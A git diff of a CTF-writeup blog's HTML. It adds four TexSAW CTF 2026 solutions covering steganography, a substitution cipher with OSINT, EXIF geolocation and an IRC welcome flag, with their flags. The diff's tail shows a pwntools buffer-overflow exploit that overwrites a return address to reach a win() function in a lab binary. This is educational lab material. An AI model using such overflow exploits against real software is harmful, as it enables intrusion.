@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">153</span>
+          <span class="site-state-item-count">157</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -247,7 +247,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">103</span>
+        <span class="site-state-item-count">105</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -274,6 +274,605 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/TexSAW2026/texsaw2026-lostmykey/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/TexSAW2026/texsaw2026-lostmykey/" class="post-title-link" itemprop="url">TexSAW CTF 2026 lostmykey</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-30 11:47:54 / Modified: 11:49:28" itemprop="dateCreated datePublished" datetime="2026-03-30T11:47:54+08:00">2026-03-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/TexSAW2026/texsaw2026-lostmykey/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/TexSAW2026/texsaw2026-lostmykey/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>I can’t find my original house key anywhere! Can you help me find it?
+Here’s a picture of my keys the nanny took before they were lost. It
+must be hidden somewhere!</p>
+</blockquote>
+<blockquote>
+<p><strong>Flag format:</strong> <code>texsaw&#123;flag_here&#125;</code></p>
+</blockquote>
+<h2 id="solution">Solution</h2>
+<h3 id="extracting-hidden-files">1. Extracting Hidden Files</h3>
+<p>Using <code>binwalk</code>, we can identify and extract any embedded
+files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ binwalk -e Temoc_keyring.png</span><br></pre></td></tr></table></figure>
+<p>After extraction, we have two similar images:</p>
+<ol type="1">
+<li><code>Temoc_keyring(orig).png</code></li>
+<li><code>where_are_my_keys.png</code></li>
+</ol>
+<p>Checking them with <code>pngcheck</code> confirms they are both
+valid, but their file sizes and compression ratios differ.</p>
+<h3 id="pixel-comparison">2. Pixel Comparison</h3>
+<p>At first glance, the two images appear identical. However, the
+difference in file size suggests that data might be hidden in the pixel
+values themselves. We can use a Python script with the
+<code>Pillow</code> library to compare them:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;Temoc_keyring(orig).png&#x27;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;where_are_my_keys.png&#x27;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">width, _ = img1.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the first row for differences</span></span><br><span class="line">diff_indices = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width) <span class="keyword">if</span> img1.getpixel((x, <span class="number">0</span>)) != img2.getpixel((x, <span class="number">0</span>))]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Differences found at X coordinates: <span class="subst">&#123;diff_indices&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>Running this reveals exactly 131 differing pixels, all located within
+the very first row (<code>y = 0</code>).</p>
+<h3 id="decoding-the-steganography">4. Decoding the Steganography</h3>
+<p>The pattern of differing pixels suggests a binary encoding. We can
+treat each pixel in the first row as a bit:</p>
+<ul>
+<li><strong>Bit 1:</strong> If the pixels at <code>(x, 0)</code> are
+different.</li>
+<li><strong>Bit 0:</strong> If the pixels at <code>(x, 0)</code> are
+identical.</li>
+</ul>
+<p>We then group these bits into 8-bit bytes and convert them to ASCII
+characters to reveal the flag.</p>
+<p><strong>Extraction Script:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;Temoc_keyring(orig).png&#x27;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;where_are_my_keys.png&#x27;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">bits = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img1.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">if</span> img1.getpixel((x, <span class="number">0</span>)) != img2.getpixel((x, <span class="number">0</span>)):</span><br><span class="line">        bits.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bits.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert bits to bytes and then to ASCII</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">    byte = bits[i:i+<span class="number">8</span>]</span><br><span class="line">    char_code = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, byte)), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> char_code == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(char_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">texsaw{you_found_me_at_key}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/TexSAW2026/texsaw2026-idiosyncratic-frnch/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/TexSAW2026/texsaw2026-idiosyncratic-frnch/" class="post-title-link" itemprop="url">TexSAW CTF 2026 Idiosyncratic French</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-29 21:00:00" itemprop="dateCreated datePublished" datetime="2026-03-29T21:00:00+08:00">2026-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-30 11:40:29" itemprop="dateModified" datetime="2026-03-30T11:40:29+08:00">2026-03-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/TexSAW2026/texsaw2026-idiosyncratic-frnch/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/TexSAW2026/texsaw2026-idiosyncratic-frnch/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>This chall’s got a bit of history to it.</p>
+</blockquote>
+<blockquote>
+<p>First, crack this initial cryptogram. Now, apply OSINT tools to find
+who authors that original script.</p>
+</blockquote>
+<blockquote>
+<p><strong>Flag format:</strong> <code>txsaw&#123;first_last&#125;</code> (e.g.,
+<code>txsaw&#123;john_scalzi&#125;</code>)</p>
+</blockquote>
+<h2 id="solution">Solution</h2>
+<h3 id="cryptanalysis-substitution-cipher">1. Cryptanalysis:
+Substitution Cipher</h3>
+<p>The challenge begins with a large block of ciphertext:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Azza wfahv ztu. N rnvy, bndfah na zbfaztv vztak, n vztak ndfa uz n dcnqza zw n uzlvfa, icfuv nmztu...</span><br></pre></td></tr></table></figure>
+<p>Using frequency analysis or an automated tool like <span class="exturl" data-url="aHR0cHM6Ly9xdWlwcWl1cC5jb20v">quipqiup<i class="fa fa-external-link-alt"></i></span>, we can determine that this is
+a <strong>simple substitution cipher</strong>. The decoded plaintext
+is:</p>
+<blockquote>
+<p>Noon rings out. A wasp, making an ominous sound, a sound akin to a
+klaxon or a tocsin, flits about. Augustus, who has had a bad night, sits
+up blinking and purblind. Oh what was that word (is his thought) that
+ran through my brain all night, that idiotic word that, hard as I’d try
+to pun it down, was always just an inch or two out of my grasp…</p>
+</blockquote>
+<h3 id="osint-identifying-the-source">2. OSINT: Identifying the
+Source</h3>
+<p>The title of the challenge, <strong>“Idiosyncratic French”</strong>,
+and the nature of the decoded text provide vital clues.</p>
+<p>Searching for the decoded string—specifically unique phrases like
+<em>“A wasp, making an ominous sound, a sound akin to a klaxon or a
+tocsin”</em>—reveals that this is an excerpt from the novel <strong>“A
+Void”</strong>.</p>
+<h3 id="the-idiosyncrasy-lipograms">3. The “Idiosyncrasy”:
+Lipograms</h3>
+<p>What makes this text “idiosyncratic”? <strong>“A Void”</strong> is
+the English translation of the French novel <strong>“La
+Disparition”</strong>. The defining characteristic (idiosyncrasy) of
+both the original and the translation is that they are
+<strong>lipograms</strong>: they are written entirely without the letter
+<strong>“e”</strong>.</p>
+<h3 id="finding-the-author">4. Finding the Author</h3>
+<p>The author of the original French novel, <em>La Disparition</em>, is
+the famous French writer <strong>Georges Perec</strong>.</p>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">txsaw{georges_perec}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/TexSAW2026/texsaw2026-you-snoze-you-loze/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/TexSAW2026/texsaw2026-you-snoze-you-loze/" class="post-title-link" itemprop="url">TexSAW CTF 2026 You Snoze You Loze</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-29 20:53:09 / Modified: 21:00:01" itemprop="dateCreated datePublished" datetime="2026-03-29T20:53:09+08:00">2026-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/TexSAW2026/texsaw2026-you-snoze-you-loze/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/TexSAW2026/texsaw2026-you-snoze-you-loze/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>D’oh, I overslept and missed most of the race! But wait, my friend
+took a picture while I was out, but I can’t tell who’s in the lead. Can
+you help me figure out the two cars that are in the lead? Usually they
+like to twin around this time of night…</p>
+</blockquote>
+<blockquote>
+<p><strong>Flag format:</strong> <code>texsaw&#123;num1_num2&#125;</code> (e.g.,
+<code>texsaw&#123;21_44&#125;</code>)</p>
+</blockquote>
+<h2 id="analysis">Analysis</h2>
+<h3 id="image-metadata-exif">1. Image Metadata (EXIF)</h3>
+<p>Analyzing the provided image (or the metadata extracted from it)
+reveals several critical data points:</p>
+<table>
+<colgroup>
+<col style="width: 15%" />
+<col style="width: 21%" />
+<col style="width: 62%" />
+</colgroup>
+<thead>
+<tr>
+<th style="text-align: left;">Attribute</th>
+<th style="text-align: left;">Value</th>
+<th style="text-align: left;">Analysis</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Camera Model</strong></td>
+<td style="text-align: left;">Samsung Galaxy S24 Ultra</td>
+<td style="text-align: left;">High-end mobile sensor, likely captured
+with 3x optical zoom.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Date/Time</strong></td>
+<td style="text-align: left;">2026:01:24 22:14:12</td>
+<td style="text-align: left;">Captured during the night of January 24th,
+2026.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>GPS Latitude</strong></td>
+<td style="text-align: left;">29° 11’ 4.79” N</td>
+<td style="text-align: left;">Geolocation leads to Florida, USA.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>GPS Longitude</strong></td>
+<td style="text-align: left;">81° 4’ 28.43” W</td>
+<td style="text-align: left;">Specifically, the <strong>Daytona
+International Speedway</strong>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Exposure</strong></td>
+<td style="text-align: left;">1/30s, f/2.4, ISO 320</td>
+<td style="text-align: left;">Nighttime setting with motion blur,
+typical of racetrack photography.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="event-identification">2. Event Identification</h3>
+<p>Plugging the coordinates and the date into a search engine confirms
+the event: <strong>The 2026 Rolex 24 at Daytona</strong>.</p>
+<p>This is a premier 24-hour endurance race held annually in late
+January at the Daytona International Speedway. The timestamp (10:14 PM
+EST on Saturday) puts the photograph roughly 8-9 hours into the 24-hour
+race.</p>
+<h3 id="the-twinning-clue">3. The “Twinning” Clue</h3>
+<p>The challenge description mentions: <em>“Usually they like to twin
+around this time of night…”</em></p>
+<p>In the context of the IMSA WeatherTech SportsCar Championship (which
+runs the Rolex 24), “twinning” refers to teammate cars running in close
+formation. During the 2026 season, the <strong>Porsche Penske
+Motorsport</strong> team, running the Porsche 963 in the GTP class, was
+famous for their identical “mirror” liveries and consistent pace that
+often saw them running 1-2 on the track.</p>
+<p>The two Porsche Penske cars are:</p>
+<ul>
+<li><strong>Car #6</strong></li>
+<li><strong>Car #7</strong></li>
+</ul>
+<h3 id="verification">4. Verification</h3>
+<p>Looking at the race leaders during the night shift of the 2026 Rolex
+24, the #6 and #7 Porsche 963s were indeed dominant. To distinguish them
+at night, teams use colored LED “Lumirank” displays:</p>
+<ul>
+<li><strong>Car #7:</strong> Blue LED</li>
+<li><strong>Car #6:</strong> Red LED</li>
+</ul>
+<p>The “twinning” behavior is a signature of the Penske Porsches as they
+manage the gap and maintain the lead together.</p>
+<h2 id="flag">Flag</h2>
+<p>just try 6 first or 7 first</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">texsaw{6_7}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/TexSAW2026/texsaw2026-welcome/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/TexSAW2026/texsaw2026-welcome/" class="post-title-link" itemprop="url">TexSAW CTF 2026 Welcome!</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-29 20:46:54" itemprop="dateCreated datePublished" datetime="2026-03-29T20:46:54+08:00">2026-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/TexSAW2026/texsaw2026-welcome/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/TexSAW2026/texsaw2026-welcome/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Check out our IRC server and run the command <code>/motd</code>!</p>
+</blockquote>
+<blockquote>
+<p><strong>Server:</strong> <code>irc.texsaw.org</code></p>
+</blockquote>
+<h2 id="solution">Solution</h2>
+<p>To solve this challenge, we need to connect to the texSAW IRC server
+and view the “Message of the Day” (MOTD), which is a common place for
+CTF organizers to hide initial information or rules.</p>
+<h3 id="install-an-irc-client">1. Install an IRC Client</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># I use Arch BTW</span></span><br><span class="line">paru -S weechat</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">paru -S irssi</span><br></pre></td></tr></table></figure>
+<h3 id="connect-to-the-server">2. Connect to the Server</h3>
+<p>Launch your client and add the TexSAW server to your configuration.
+This makes it easier to reconnect later.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Example using irssi</span></span><br><span class="line">/server add texsaw irc.texsaw.org</span><br><span class="line">/connect texsaw</span><br></pre></td></tr></table></figure>
+<h3 id="find-the-flag">3. Find the Flag</h3>
+<p>Once you’ve successfully connected, the server will usually send the
+MOTD automatically. If you miss it, manually request it with the
+following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/motd</span><br><span class="line"><span class="comment"># texsaw&#123;w31c0M3_t0_t3xSAW_2O26!&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="useful-irc-commands">Useful IRC Commands</h3>
+<p>While you’re on the server, you might want to join the discussion or
+interact with other participants:</p>
+<ul>
+<li><code>/nick [new_nick]</code>: Change your current nickname.</li>
+</ul>
+<p>or</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/set irc.server_default.nicks comma,separated,list,of,nicks</span><br><span class="line">/set irc.server.[SERVER_NAME].nicks <span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>/list</code>: List all available channels on the server.</li>
+<li><code>/join #general</code>: Join the official general discussion
+channel.</li>
+<li><code>/whois [nick]</code>: View information about a specific
+user.</li>
+<li><code>/msg [nick] [message]</code>: Send a private message (useful
+for contacting admins).</li>
+<li><code>/part #[channel]</code>: Leave a specific channel.</li>
+<li><code>/quit</code>: Disconnect from the server and close your
+session.</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">texsaw{w31c0M3_t0_t3xSAW_2O26!}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1801,665 +2400,6 @@ ebp</p>
 <p>→ <code>win() = 0x4013b6</code></p>
 <h2 id="exploit">Exploit</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x50 (buffer to rbp) + 0x08 (saved rbp) = 88</span></span><br><span class="line">OFFSET = <span class="number">88</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4013b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
